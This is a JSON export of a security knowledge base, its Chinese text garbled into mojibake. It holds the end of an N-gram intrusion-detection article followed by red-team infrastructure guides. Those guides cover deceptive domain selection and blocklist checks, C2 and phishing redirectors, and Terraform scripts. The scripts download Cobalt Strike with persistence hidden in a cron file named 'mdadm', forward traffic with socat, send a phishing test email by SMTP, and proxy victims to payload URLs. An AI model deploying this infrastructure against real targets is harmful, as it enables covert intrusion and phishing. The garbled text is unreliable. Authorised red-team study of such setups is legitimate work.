letter in zip(*[text[i:] for i in range(n)]):\r\n\t\t\tself.table[''.join(letter)] = self.table.get(''.join(letter), 0) + 1 # increment count\r\n\r\nprint NGram(\"abcdef\", n=3).table\r\n```\r\n\r\n## NIDSä¸­çš„åº”ç”¨\r\n\r\n### æ¡ˆä¾‹ä¸€\r\n\r\nKe Wang å’Œ Salvatore J. Stolfo åœ¨ã€ŠAnomalous Payload-based Network Intrusion Detection ã€‹ä¸­æå‡ºäº†ä¸€ç§åŸºäº1-Gramçš„æ–¹æ³•ï¼Œå°†æ•°æ®åŒ…ä»¥ç«¯å£åˆ†ç±»ï¼Œç›¸åŒç«¯å£çš„æ•°æ®åŒ…å†ä»¥ä¸åŒçš„é•¿åº¦åˆ†ç±»ï¼Œç„¶åè®¡ç®—å‡ºASCIIå­—ç¬¦0-255çš„å¹³å‡åˆ†å¸ƒé¢‘ç‡ï¼Œä½œä¸ºä¸€ä¸ªç‰¹å¾ï¼ŒåŠ ä¸Šå¹³å‡åˆ†å¸ƒé¢‘ç‡çš„å¹³å‡å€¼ï¼Œæ–¹å·®ï¼Œæ ‡å‡†å·®ä½œä¸ºå¦ä¸€ä¸ªç‰¹å¾ã€‚æœ‰äº†è¿™ä¸¤ä¸ªç‰¹å¾ï¼Œå°±å¯ä»¥åœ¨å¼‚å¸¸æ£€æµ‹ä¸­å»ºç«‹æ¨¡å‹ï¼Œå®Œæˆä»»åŠ¡ã€‚å¦‚ä¸‹å›¾ï¼š\r\n\r\n![æ¡ˆä¾‹ä¸€](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/qvrUtF.jpg)\r\n\r\næ•´ä¸ªæ€è·¯æ˜¯ï¼šæ˜¯è®­ç»ƒé˜¶æ®µï¼Œç®—å‡ºä¸åŒç«¯å£/é•¿åº¦æ•°æ®åŒ…çš„å¹³å‡å­—èŠ‚æ¦‚ç‡åˆ†å¸ƒæ¨¡å‹(å¹³å‡å€¼ï¼Œæ–¹å·®ï¼Œæ ‡å‡†å·®)ï¼Œé¢„æµ‹é˜¶æ®µï¼Œç®—å‡ºæ–°æ•°æ®åŒ…çš„å­—èŠ‚æ¦‚ç‡åˆ†å¸ƒæ¨¡å‹ï¼Œä½¿ç”¨é©¬æ°è·ç¦»(Mahalanobis distance)ï¼Œæ¯”è¾ƒä¸¤ä¸ªæ¨¡å‹çš„å·®å¼‚ï¼Œå½“å·®å¼‚è¶…è¿‡æŸä¸ªé˜ˆå€¼çš„æ—¶å€™ï¼Œåˆ™æ£€æµ‹å‡ºå¼‚å¸¸ã€‚è¿˜åŠ ä¸Šäº†å¢é‡å­¦ä¹ (Incremental learning)ä½¿æ•´ä¸ªæ¨¡å‹éšç€æ–°æ•°æ®çš„åˆ°æ¥ï¼Œä¸æ–­çš„æ›´æ–°è‡ªå·±çš„å‚æ•°(å¹³å‡å€¼ï¼Œæ–¹å·®ï¼Œæ ‡å‡†å·®)ï¼Œâ€æ·˜æ±°â€æ—§æ•°æ®ï¼Œâ€æ›´æ–°â€æ–°æ•°æ®ã€‚\r\n\r\næ–‡ä¸­è¿˜æåˆ°äº†ä¸€ç§å®ç°ç­¾åæ£€æµ‹çš„æ–¹æ³•ï¼šå°†å­—èŠ‚çš„å¹³å‡æ¦‚ç‡åˆ†å¸ƒå›¾ï¼ŒæŠŠé¢‘ç‡ä»é«˜åˆ°ä½è¿›è¡Œé‡æ’åºã€‚è¿™æ ·å¾—å‡ºçš„åˆ†å¸ƒå›¾å¾ˆåƒZipf-likeåˆ†å¸ƒ(æŒ‡æ•°å‡½æ•°/å¹‚å‡½æ•°å°‘æ•°å€¼é¢‘ç¹å‡ºç°ï¼Œå¤šæ•°å€¼å¶å°”å‡ºç°ã€‚é€šä¿—åœ°è®²ï¼Œå°±æ˜¯äºŒå…«åŸåˆ™ï¼š80%çš„è´¢å¯Œé›†ä¸­åœ¨20%çš„äººæ‰‹ä¸­â€¦â€¦80%çš„ç”¨æˆ·åªä½¿ç”¨20%çš„åŠŸèƒ½â€¦â€¦20%çš„ç”¨æˆ·è´¡çŒ®äº†80%çš„è®¿é—®é‡â€¦â€¦)ï¼Œè¿™æ ·ç”¨å¾ˆå°çš„é•¿åº¦å°±è¡¨ç¤ºäº†æ•´ä¸ªASCIIèŒƒå›´çš„å¹³å‡æ¦‚ç‡åˆ†å¸ƒã€‚æ¯”å¦‚ä¸‹å›¾ï¼Œé‡æ’åºååªç”¨83ä¸ªunique çš„å­—ç¬¦å°±è¡¨ç¤ºäº†æ•´ä¸ªå¹³å‡æ¦‚ç‡åˆ†å¸ƒã€‚\r\n\r\n![æ¡ˆä¾‹ä¸€](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/frPmAf.jpg)\r\n\r\né€šè¿‡è¿™ç§æ–¹æ³•å°†å·²è¯†åˆ«/ç¡®è®¤çš„å¼‚å¸¸æ•°æ®åŒ…åšæˆç­¾å(signature)ï¼Œå¯ä»¥å¿«é€Ÿå‡†ç¡®åœ°æ£€æµ‹å…¶ä»–åœ°æ–¹å¯èƒ½å‡ºç°çš„ç›¸åŒå¼‚å¸¸æ•°æ®åŒ…ã€‚\r\n\r\n### æ¡ˆä¾‹äºŒ\r\n\r\nå‰é¢è¯´åˆ°çš„æ–¹æ³•æ˜¯1-Gramçš„åº”ç”¨ï¼Œç„¶è€Œ1-Gramçš„ç®€å•æ€§(å¹³å‡å­—èŠ‚æ¦‚ç‡åˆ†å¸ƒ)å¾ˆå®¹æ˜“å—åˆ°æ‹Ÿæ€æ”»å‡»(mimicry attacks)ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å¡«å……æ— ç”¨å­—ç¬¦çš„æ–¹æ³•æ¥ä¼ªé€ å‡ºæ­£å¸¸çš„æ¦‚ç‡åˆ†å¸ƒï¼Œä»è€Œç»•è¿‡æ£€æµ‹ã€‚äºæ˜¯ä»–ä»¬åˆæå‡ºäº†åŸºäºN-gram Nå¤§äº1 çš„æ–¹æ³•ã€‚è§ã€ŠAnagram: A Content Anomaly Detector Resistant to Mimicry Attackã€‹\r\n\r\nN-gramçš„æœ¬è´¨å’Œ1-Gramæ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ç‰¹å¾ç©ºé—´å˜å¤§å¤§ï¼Œåœ¨è®¡ç®—çš„æ—¶é—´/å†…å­˜å¼€é”€ä¹Ÿå¾ˆå¤§ã€‚æ¯”å¦‚ä¸€ä¸ªTCP æ•°æ®åŒ…ï¼Œé•¿åº¦æ˜¯256ï¼Œé‚£ä¹ˆä»–çš„N-garmå°±æœ‰256^nã€‚ä½œè€…é€šè¿‡é€‰å–å‡ ä¸ªNå€¼ï¼Œæ¯”å¦‚3-Gram, 4-Gram, 5-Gramç­‰ç­‰ï¼Œç„¶åç”¨Bloom filter(åŸç†ç›¸å½“äºå“ˆå¸Œè¡¨)è¿›è¡Œå­˜å‚¨ã€‚æœ€ååœ¨ROCæ›²çº¿ä¸­æ¯”è¾ƒè¿™äº›N-gramçš„å¬å›ç‡ä¸å‡†ç¡®ç‡ï¼Œé€‰å–åˆé€‚çš„æ¨¡å‹ã€‚å¦‚å›¾ï¼š\r\n\r\n![æ¡ˆä¾‹äºŒ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/JsmuVT.jpg)\r\n\r\nå…¶ä»–ç»†èŠ‚å°±ç•¥è¿‡ï¼Œæ„Ÿå…´è¶£å¯ä»¥è‡ªå·±æŸ¥é˜…ã€‚\r\n\r\n## å…¶ä»–åº”ç”¨\r\n\r\nN-gramåœ¨å®‰å…¨é¢†åŸŸè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„åº”ç”¨ï¼Œæ¯”å¦‚HIDS(é€šè¿‡ç³»ç»Ÿè°ƒç”¨åšå¼‚å¸¸æ£€æµ‹)ã€æ¶æ„è½¯ä»¶åˆ†ç±»/è¯†åˆ«ã€æ•æ„Ÿè¯è¯†åˆ«/å±è”½ç­‰ç­‰ã€‚ä½†æ˜¯æ•ˆæœå´ä¸å¥½ï¼Œè¯¯æŠ¥ã€æ¼æŠ¥ä¸¥é‡ã€‚åŸå› ä¹‹å‰ä¹Ÿæè¿‡ï¼Œæ¯”å¦‚ï¼šæµ‹è¯•è¿˜åœ¨ç”¨DARPA1999, KDD99ç­‰è€æ ·æœ¬ã€æ¨¡å‹å­˜åœ¨åå·®æ ·æœ¬æ€§ã€ç¼ºä¹å®è·µç­‰ç­‰é—®é¢˜ã€‚\r\n\r\nå¼€æºé¡¹ç›®å‚è€ƒï¼š\r\n\r\n[https://github.com/chwress/salad](https://github.com/chwress/salad)\r\n\r\n## å‚è€ƒèµ„æ–™\r\n\r\n1. [Anomalous Payload-based Network Intrusion Detection](http://academiccommons.columbia.edu/catalog/ac%3A125704)\r\n2. [Anagram: A Content Anomaly Detector Resistant to Mimicry Attack](http://ids.cs.columbia.edu/sites/default/files/anagram-camera-fixed.pdf)\r\n3. [N-Grams tutorial](https://lagunita.stanford.edu/c4x/Engineering/CS-224N/asset/slp4.pdf)\r\n4. [N-Grams wikipedia](https://en.wikipedia.org/wiki/N-gram)\r\n\r\nâŒ¥E"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red TeamåŸºç¡€è®¾æ–½/åŸŸå/","title":"åŸŸå"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: åŸŸå\r\ntags:\r\n- Red TeamåŸºç¡€è®¾æ–½\r\n- åŸŸå\r\n---\r\n\r\né€‰æ‹©å…·æœ‰è¿·æƒ‘æ€§çš„åŸŸåè‡³å…³é‡è¦ï¼Œå¦‚ï¼šå¯ä»¥ä½¿ç”¨expireddomains.netæ¥æ”¶é›†æœ€è¿‘è¿‡æœŸæˆ–å·²ä¸¢å¼ƒåŸŸåã€‚\r\n\r\n![tNsrRk](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/tNsrRk.jpg)\r\n\r\nåŒæ—¶è¦ç¡®è®¤åŸŸåä¸ä¼šè¢«ç¬¬ä¸‰æ–¹å‚å•†åˆ—å…¥é»‘åå•ï¼š\r\n\r\n- McAfee https://trustedsource.org/en/feedback/url?action=checksingle\r\n- Fortiguard http://www.fortiguard.com/iprep\r\n- Symantec + BlueCoat http://sitereview.bluecoat.com/sitereview.jsp\r\n- Checkpoint (requires free account) https://www.checkpoint.com/urlcat/main.htm\r\n- Palo Alto https://urlfiltering.paloaltonetworks.com/\r\n- Sophos (submission only; no checking)  https://secure2.sophos.com/en-us/support/contact-support.aspx - Click Submit a Sample -> Web Address\r\n- TrendMicro https://global.sitesafety.trendmicro.com/\r\n- Brightcloud http://www.brightcloud.com/tools/url-ip-lookup.php\r\n- Websense (Forcepoint) http://csi.websense.com/\r\n- Lightspeed Systems https://archive.lightspeedsystems.com/\r\n- Chameleon https://github.com/mdsecactivebreach/Chameleon\r\n- SenderBase https://www.senderbase.org/\r\n- MultiBL http://multirbl.valli.org/\r\n- MXToolBox - Blacklists https://mxtoolbox.com/blacklists.aspx\r\n\r\n# æ¥æº\r\n- [https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red TeamåŸºç¡€è®¾æ–½/æ¶æ„è®¾è®¡/","title":"æ¶æ„è®¾è®¡"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: æ¶æ„è®¾è®¡\r\ntags:\r\n- Red TeamåŸºç¡€è®¾æ–½\r\n- æ¶æ„\r\n---\r\n\r\n# 1. åŠŸèƒ½éš”ç¦»\r\nå°†åŠŸèƒ½éš”ç¦»åœ¨ä¸åŒçš„èµ„äº§ä¸Šå¯ä»¥é¿å…è¢«Blue teamä¸€çªç«¯ï¼š\r\n\r\n- é’“é±¼SMTP\r\n- é’“é±¼Payload\r\n- é•¿æœŸä½¿ç”¨çš„C2\r\n- çŸ­æœŸä½¿ç”¨çš„C2\r\n- ...ç­‰ç­‰\r\n\r\n# 2. Redirectors\r\nä¸ºäº†è¿›ä¸€æ­¥æé«˜ç³»ç»Ÿå¼¹æ€§å’Œéšè”½æ€§ï¼Œæ¯ä¸ªåç«¯èµ„äº§éƒ½åº”è¯¥åœ¨å…¶å‰é¢æ”¾ç½®ä¸€ä¸ªredirectorï¼Œè¿™ç§æ–¹å¼æœ‰ä¸¤ç§å¥½å¤„ï¼š1.æ˜¯èƒ½å¤Ÿè§£è€¦å„ä¸ªåŠŸèƒ½èµ„äº§æœåŠ¡ï¼›2.æ˜¯èƒ½å¤Ÿè¾¾åˆ°éšè”½æ•ˆæœã€‚å½“æŸä¸€ä¸ªèµ„äº§æœåŠ¡è¢«Blue teamå‘ç°æ—¶ï¼Œæ— éœ€éƒ¨ç½²æ•´å¥—åç«¯æœåŠ¡ï¼Œä¾¿å¯è¿›è¡Œè¿ç§»ä¼šè¯ã€é‡è¿æ¥åç«¯çš„èµ„äº§ç­‰ã€‚\r\n\r\nå¸¸è§çš„redirectorç±»å‹:\r\n\r\n- SMTP\r\n- Payloads\r\n- Web æµé‡\r\n- C2 (HTTP[S]ã€DNSã€ç­‰)\r\n\r\n# 3. æ¡ˆä¾‹\r\nä¸‹é¢è¿™ä¸ªæ ·ä¾‹ï¼Œä½¿ç”¨äº†åŠŸèƒ½åˆ†ç¦»å’Œredirectorçš„è®¾è®¡æ€è·¯ã€‚å…¶ä¸­LT DNS C2ä»£è¡¨é•¿æœŸçš„ DNS C2 æœåŠ¡ï¼› ST DNS C2ä»£è¡¨çŸ­æœŸçš„ DNS C2 æœåŠ¡ï¼›ST HTTP C2 ä»£è¡¨çŸ­æœŸçš„ HTTP C2 æœåŠ¡ã€‚\r\n\r\n![nQ3ThV](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/nQ3ThV.jpg)\r\n\r\nè¿˜å¯ä»¥å‚è€ƒ [[CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½]]ã€‚\r\n\r\n# 4. å‚è€ƒ\r\n- [https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½]: ../å®è·µå‚è€ƒ/CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½.md \"CIA å¦‚ä½•å®ç°C&CåŸºç¡€è®¾æ–½\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red TeamåŸºç¡€è®¾æ–½/è‡ªåŠ¨åŒ–éƒ¨ç½²/","title":"è‡ªåŠ¨åŒ–éƒ¨ç½²"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: è‡ªåŠ¨åŒ–éƒ¨ç½²\r\ntags:\r\n- Red TeamåŸºç¡€è®¾æ–½\r\n- é’“é±¼\r\n- å‘½ä»¤ä¸æ§åˆ¶ C2\r\n- Redirector\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\nå‰é¢æåˆ°çš„æ¶æ„å’Œå„ç§å„æ ·çš„Redirectorï¼Œåœ¨å®é™…éƒ¨ç½²ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ä¼šéå¸¸ç¹çï¼›ä»2014å¹´å¼€å§‹å·²ç»æœ‰äººæå‡ºäº†åŸºç¡€è®¾æ–½å³ä»£ç ï¼ˆInfrastructure as Codeï¼‰ï¼Œä½œä¸ºæœ€ä½³å®è·µï¼ŒåŸºç¡€è®¾æ–½åŠä»£ç æˆæƒæ‰€æœ‰å‡†å¤‡è®¡ç®—èµ„æºæ‰€éœ€è¦åšçš„å·¥ä½œéƒ½å¯ä»¥é€šè¿‡ä»£ç æ¥å®Œæˆã€‚ è¿™ç±»çš„å¹³å°æ¯”è¾ƒå¤šï¼Œæ¯”å¦‚Terraformï¼ŒChefï¼ŒPuppet Ansibleï¼ŒCloudFormationï¼ŒSaltç­‰ç­‰ã€‚ä½¿ç”¨ Terraform æœ‰å¾ˆå¤šå¸å¼•åŠ›ï¼Œå¦‚ï¼š\r\n\r\n- è®¾è®¡/æµ‹è¯•åŸºç¡€è®¾æ–½ä¸€æ¬¡ï¼Œå³å¯å¤šæ¬¡é‡å¤ä½¿ç”¨\r\n- é…ç½®æ–‡ä»¶å¯ä»¥æ˜¯ä»£ç æ§åˆ¶çš„\r\n- å¯ä»¥ä½¿ç”¨å•ä¸ªå‘½ä»¤åˆ›å»ºå’Œé”€æ¯åŸºç¡€è®¾æ–½\r\n- ç›‘æ§çŠ¶æ€æ”¹å˜\r\n\r\n# 2. åŸºç¡€è®¾æ–½æ¦‚è§ˆ\r\nä¸‹é¢æ˜¯ä¸€ä¸ªæ¶æ„å›¾ï¼Œæ˜¾ç¤ºäº†æ„å»ºçš„åŸºç¡€è®¾æ–½â€”â€”å®ƒå¯ä»¥è€Œä¸”é€šå¸¸æ›´åŠ build-outï¼Œä½†åŸåˆ™ä¿æŒä¸å˜â€”â€”Redirectoræ”¾ç½®åœ¨æ¯å°æœåŠ¡å™¨çš„å‰é¢ï¼Œä½¿åŸºç¡€è®¾æ–½æ›´åŠ éšè”½ï¼Œèƒ½å¤Ÿç”¨æ–°çš„æœåŠ¡å™¨å¿«é€Ÿæ›´æ¢æ¶ˆè€—çš„æœåŠ¡å™¨ï¼š\r\n\r\n![DYhT1D](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/DYhT1D.jpg)\r\n\r\næ€»å…±æœ‰6å°æœåŠ¡å™¨ï¼Œ3ä¸ªé•¿æœŸæœåŠ¡ï¼ˆé’“é±¼ã€payload å’Œ c2ï¼‰ï¼Œ3 ä¸ªredirectorï¼ˆsmtpã€payload å’Œ c2ï¼‰ã€‚ æˆ‘ä»¬å‡è®¾è¿™äº›æœåŠ¡å™¨åœ¨å®æˆ˜ä¸­ä¼šBlue teamæ£€æµ‹åˆ°å¹¶éœ€è¦é”€æ¯ï¼Œè¿™å°±æ˜¯ Terraform è‡ªåŠ¨åŒ–éƒ¨åˆ†çš„ç”¨æ­¦ä¹‹åœ°â€”â€”å› ä¸ºæˆ‘ä»¬çš„ç¯å¢ƒçŠ¶æ€æ˜¯åœ¨ Terraform é…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„ï¼Œæˆ‘ä»¬å‡ ä¹å¯ä»¥ç«‹å³é‡å»ºé‚£äº›é”€æ¯çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”æ“ä½œå¯ä»¥ç»§ç»­è¿›è¡Œè€Œä¸ä¼šå‡ºç°æ›´å¤§çš„ä¸­æ–­ã€‚\r\n\r\n# 3. é…ç½®åŸºç¡€è®¾æ–½\r\n**åŸºç¡€è®¾æ–½æ˜¯é€šè¿‡åˆ©ç”¨ä»¥ä¸‹æœåŠ¡æ„å»ºçš„ï¼š**\r\n\r\n- DigitalOcean Droplets(CVM)\r\n- DigitalOcean DNS managementï¼Œéœ€è¦èƒ½å¤Ÿä¸ºsmtp redirectorè®¾ç½® PTR DNS è®°å½•ï¼Œä»¥å‡å°‘è¢«ç›®æ ‡é‚®ä»¶ç½‘å…³å½’ç±»ä¸ºåƒåœ¾é‚®ä»¶çš„æ¦‚ç‡\r\n- CloudFlare DNS managementï¼Œç”¨äºæ§åˆ¶æŒ‡å‘é•¿æœŸæœåŠ¡å™¨çš„ DNS è®°å½•\r\n\r\nå¯ä»¥ä½¿ç”¨ Amazon AWS æˆ–å…¶ä»–æµè¡Œçš„ VPS æ¥æ„å»ºæœåŠ¡å™¨ï¼Œåªè¦å®ƒæ”¯æŒ Terraform å³å¯ï¼Œè¿™åŒæ ·é€‚ç”¨äº DNS ç®¡ç†éƒ¨åˆ†ã€‚\r\n\r\næ–‡ä»¶ç»“æ„ï¼š\r\n\r\n- ç”±ä»¥ä¸‹æ–¹å¼ç»„ç»‡çš„ terraform é…ç½®æ–‡ä»¶å®šä¹‰ï¼š\r\n  - ![image-20230112232314479](/Users/mars/Library/Application Support/typora-user-images/image-20230112232314479.png)\r\n- Configsï¼šåŒ…æ‹¬payload redirectorçš„é…ç½®ï¼ˆapache: .htaccessï¼Œapache2.confï¼‰ï¼Œsmtp redirectorï¼ˆpostfix: header_checks - ç”¨äºå»é™¤åŸå§‹ smtp æœåŠ¡å™¨çš„é‚®ä»¶æ ‡å¤´ï¼Œmaster.cf - TLS å’Œ opendkim çš„é€šç”¨åç¼€é…ç½®ï¼Œopendkim.conf - ä½¿ç”¨ postfix é…ç½® DKIM é›†æˆï¼‰\r\n- providersï¼šè¯¸å¦‚ DigitalOcean å’Œ CloudFlare ä¹‹ç±»çš„åŸºç¡€è®¾æ–½\r\n- variablesï¼šterraformçš„API keyå’Œå…¶ä»–ç›¸å…³æ•°æ®\r\n- sshkeysï¼šsshç™»å½•å‡­è¯ç­‰ä¿¡æ¯\r\n- dnsï¼šDNSç›¸å…³é…ç½®\r\n- firewallsï¼šè®¿é—®æ§åˆ¶\r\n- outputsï¼šåŸºç¡€è®¾æ–½çš„å…³é”® IP å’ŒåŸŸåä¿¡æ¯\r\n\r\n# 4. å˜é‡\r\nVariables.tf å­˜å‚¨è¯¸å¦‚ API tokensã€redirectorså’Œ c2 åŸŸåã€é˜²ç«å¢™è§„åˆ™ä¹‹ç±»çš„å†…å®¹ï¼š\r\n\r\n```\r\n  # tokens, api keys\r\n  variable \"do-token\" {\r\n      default = \"yourdigitaloceantoken\" }\r\n  \r\n  variable \"cf-token\" {\r\n      default = \"yourcloudflaretoken\" }\r\n  \r\n  variable \"cf-email\" {\r\n      default = \"xxx@xxx.com\" }\r\n  \r\n  # operator IPs\r\n  variable \"operator-ip\" {\r\n      default = \"aaa.bbb.ccc.ddd\" }\r\n  \r\n  # ssh keys\r\n  variable \"ssh-public-key\" {\r\n      default = \"/root/.ssh/id_rsa.pub\" }\r\n  \r\n  # domains & subdomains\r\n  variable \"domain-rdir\" {\r\n      default = \"example.com\" }\r\n  \r\n  variable \"domain-c2\" {\r\n      default = \"example.net\" }\r\n  \r\n  variable \"sub1\" {\r\n      default = \"static\" }\r\n  \r\n  variable \"sub2\" {\r\n      default = \"ads\" }\r\n  \r\n  variable \"sub3\" {\r\n      default = \"js\" }\r\n  \r\n  variable \"sub4\" {\r\n      default = \"css\" }\r\n  \r\n  variable \"sub5\" {\r\n      default = \"apple\" }\r\n  \r\n  variable \"sub6\" {\r\n      default = \"login\" }\r\n      \r\n  variable \"cspw\" {\r\n      default = \"somecrazystrongpasswordgoesherelel\" }\r\n```\r\n\r\n# 5. C2\r\nä¸‹é¢æ˜¯ C2 æœåŠ¡å™¨çš„ remote-exec Terraform é…ç½®å™¨ï¼Œå®ƒä¸‹è½½ CS zipï¼Œä½¿ç”¨ç»™å®šçš„ CS å¯†ç è§£å‹ç¼©å®ƒå¹¶åˆ›å»ºä¸€ä¸ª cron ä»¥ç¡®ä¿ C2 æœåŠ¡å™¨åœ¨æœåŠ¡å™¨å¯åŠ¨åå¯åŠ¨ï¼š\r\n\r\n```\r\n  provisioner \"remote-exec\" {\r\n      inline = [\r\n          \"apt update\",\r\n          \"apt-get -y install zip default-jre\",\r\n          \"cd /opt; wget ${var.csDownloadUrl} -O cobaltstrike.zip\",\r\n          \"echo \\\"@reboot root cd /opt/cobaltstrike/; ./teamserver ${digitalocean_droplet.c2-http.ipv4_address} ${var.cspw}\\\" >> /etc/cron.d/mdadm\",\r\n          \"unzip -P ${var.cspw} cobaltstrike.zip && shutdown -r\"\r\n      ]\r\n    }\r\n```\r\n\r\n# 6. C2 Redirector\r\nä½¿ç”¨ socat å°†ç«¯å£ 80 å’Œ 443 ä¸Šçš„æ‰€æœ‰ä¼ å…¥æµé‡é‡å®šå‘åˆ°è¿è¡Œ Cobalt Strike å›¢é˜ŸæœåŠ¡å™¨çš„ä¸»è¦ HTTP C2 æœåŠ¡å™¨ï¼š\r\n\r\n```\r\n  provisioner \"remote-exec\" {\r\n      inline = [\r\n          \"apt update\",\r\n          \"apt-get -y install socat\",\r\n          \"echo \\\"@reboot root socat TCP4-LISTEN:80,fork TCP4:${digitalocean_droplet.c2-http.ipv4_address}:80\\\" >> /etc/cron.d/mdadm\",\r\n          \"echo \\\"@reboot root socat TCP4-LISTEN:443,fork TCP4:${digitalocean_droplet.c2-http.ipv4_address}:443\\\" >> /etc/cron.d/mdadm\",\r\n          \"shutdown -r\"\r\n      ]\r\n    }\r\n```\r\n\r\næµ‹è¯• C2 åŠå…¶Redirector\r\n\r\n- ![image-20230112232333800](/Users/mars/Library/Application Support/typora-user-images/image-20230112232333800.png)\r\n\r\n# 7. é’“é±¼\r\nä½¿ç”¨GoPhish æ¡†æ¶ï¼Œå¼€æ”¾ç«¯å£ 3333ï¼Œä½†åªå…è®¸ä½¿ç”¨ DigitalOcean é˜²ç«å¢™çš„æ“ä½œå‘˜è®¿é—®ï¼š\r\n\r\n```\r\n  resource \"digitalocean_firewall\" \"phishing\" {\r\n      name = \"phishing\"\r\n      droplet_ids = [\"${digitalocean_droplet.phishing.id}\"]\r\n  \r\n      inbound_rule = [\r\n          {\r\n              protocol = \"tcp\"\r\n              port_range = \"3333\"\r\n              source_addresses = [\"${var.operator-ip}\"]\r\n          }\r\n      ]\r\n      outbound_rule = [\r\n          {\r\n              protocol = \"tcp\"\r\n              port_range = \"25\"\r\n              destination_addresses = [\"${digitalocean_droplet.phishing-rdr.ipv4_address}\"]\r\n          }\r\n      ]\r\n  }\r\n```\r\n\r\n# 8. é’“é±¼ Redirector\r\nè¿™æ˜¯æœ€è€—æ—¶çš„éƒ¨åˆ†ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œè®¾ç½® SMTP æœåŠ¡å™¨é€šå¸¸æ˜¯ä¸€ä¸ªéå¸¸ç—›è‹¦çš„è¿‡ç¨‹ã€‚ è‡ªåŠ¨åŒ–éƒ¨ç½²çš„ä»·å€¼åœ¨äºä¸€æ—¦å®ƒè¢«å‘ç°å¹¶é”€æ¯ï¼Œæ‚¨å°†æ°¸è¿œä¸éœ€è¦ä»å¤´å¼€å§‹é‡å»º SMTP æœåŠ¡å™¨ï¼›è®¾ç½®åŒ…æ‹¬ï¼š\r\n\r\n- SPF è®°å½•\r\n- DKIM\r\n- åŠ å¯†\r\n- postfix é…ç½®ä¸ºä¸­ç»§\r\n- æ¸…ç†ç”µå­é‚®ä»¶æ ‡å¤´ä»¥æ··æ·†åŸå§‹ç”µå­é‚®ä»¶æœåŠ¡å™¨\r\n\r\næµ‹è¯•é’“é±¼åŠå…¶Redirector\r\n\r\n- ä¸€æ—¦åŸºç¡€è®¾æ–½å»ºç«‹èµ·æ¥ï¼Œé’“é±¼ç›¸å…³çš„DNS åŒºåŸŸåº”è¯¥æœ‰ spfã€dkim å’Œ dmarc è®°å½•ï¼Œç±»ä¼¼äºè¿™é‡Œçœ‹åˆ°çš„é‚£äº›ï¼š\r\n- ![5j8gR9](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/5j8gR9.jpg)\r\n- å®Œæˆ DNS è®¾ç½®åï¼Œå¯ä»¥é€šè¿‡ä¸­ç»§æœåŠ¡å™¨ä»å®é™…çš„é’“é±¼æœåŠ¡å™¨å‘ gmail å‘é€å¿«é€Ÿæµ‹è¯•ç”µå­é‚®ä»¶ï¼Œçœ‹çœ‹ spfã€dkim å’Œ dmarc æ˜¯å¦æ£€æŸ¥ PASSï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°ä»–ä»¬åœ¨æˆ‘ä»¬çš„æ¡ˆä¾‹ä¸­æ‰€åšçš„ï¼š\r\n\r\n```\r\n  telnet redteam.me 25\r\n  helo redteam.me\r\n  mail from: olasenor@redteam.me\r\n  rcpt to: mantvydo@gmail.com\r\n  data\r\n  to: Mantvydas Baranauskas <mantvydo@gmail.com>\r\n  from: Ola Senor <olasenor@redteam.me>\r\n  subject: daily report\r\n  \r\n  Hey Mantvydas,\r\n  As you were requesting last week - attaching as promised the documents needed to keep the project going forward.\r\n  .\r\n```\r\n\r\n- ![DCsD4o](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/DCsD4o.jpg)\r\n\r\n# 9. Payload Redirector\r\nPayload RedirectoræœåŠ¡å™¨å»ºç«‹åœ¨ apache2 mod_rewrite å’Œproxyæ¨¡å—ä¸Šã€‚ mod_rewrite æ¨¡å—å…è®¸æˆ‘ä»¬ç¼–å†™ç»†ç²’åº¦çš„ URL é‡å†™è§„åˆ™ï¼Œå¹¶å°†å—å®³è€…çš„ HTTP è¯·æ±‚ä»£ç†åˆ°åˆé€‚ä½ç½®ã€‚\r\n\r\nä¸‹é¢æ˜¯ä¸€ä¸ª .htaccess æ–‡ä»¶ï¼Œè¯´æ˜ä½•æ—¶ã€ä½•åœ°ä»¥åŠå¦‚ä½•ï¼ˆå³ä»£ç†æˆ–é‡å®šå‘ï¼‰é‡å†™ä¼ å…¥çš„ HTTP è¯·æ±‚ï¼š\r\n\r\n```\r\n  RewriteEngine On\r\n  RewriteCond %{HTTP_USER_AGENT} \"android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos\" [NC]\r\n  RewriteRule ^.*$ http://payloadURLForMobiles/login [P]\r\n  RewriteRule ^.*$ http://payloadURLForOtherClients/%{REQUEST_URI} [P]\r\n```\r\n\r\nä¸‹é¢çš„æˆªå›¾åº”è¯¥è¯´æ˜äº†ä¸Šè¿°æ¦‚å¿µï¼š\r\n\r\n- 